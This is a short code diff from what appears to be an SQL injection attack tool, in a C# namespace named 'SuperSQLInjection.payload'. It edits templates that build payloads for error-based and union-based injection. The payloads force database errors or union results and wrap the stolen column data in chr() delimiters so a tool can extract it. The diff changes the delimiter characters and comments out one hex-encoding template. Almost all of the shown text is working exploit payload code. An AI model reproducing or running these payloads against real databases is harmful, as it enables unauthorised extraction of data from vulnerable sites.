@@ -81,7 +81,7 @@ namespace SuperSQLInjection.payload
         //error方式
         public static String error_value = " 1=cast((chr(94)||chr(94)||chr(33)||({data})||chr(33)||chr(94)||chr(94)) as numeric)";
 
-        public static String hex = "(select hex({data}))";
+        //public static String hex = "(select hex({data}))";
         public static String hex_value = "(select hex(convert(({data}) using UTF8)))";
 
         public static String substr_value = "(select substr({data},{start},{len}))";
@@ -126,7 +126,7 @@ namespace SuperSQLInjection.payload
         /// <param name="index">第几行数据，1开始</param>
         public static String getErrorDataValue(String dbname, String table, int index, List<String> columns)
         {
-            String data = data_value.Replace("{columns}", unionColumns(columns, "||chr(36)||chr(36)||chr(36)||"));
+            String data = data_value.Replace("{columns}", unionColumns(columns, "||chr(36)||chr(9)||chr(36)||"));
             String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index.ToString());
             return error_value.Replace("{data}", d);
         }
@@ -179,7 +179,7 @@ namespace SuperSQLInjection.payload
         public static String getUnionDataValue(int columnsLen, int showIndex, List<String> columns, String dbname, String table, String index)
         {
             StringBuilder sb = new StringBuilder();
-            String data = "chr(94)||chr(94)||chr(33)||" + unionColumns(columns, "||chr(36)||chr(36)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
+            String data = "chr(94)||chr(94)||chr(33)||" + unionColumns(columns, "||chr(36)||chr(9)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
             for (int i = 1; i <= columnsLen; i++)
             {
                 if (i == showIndex)
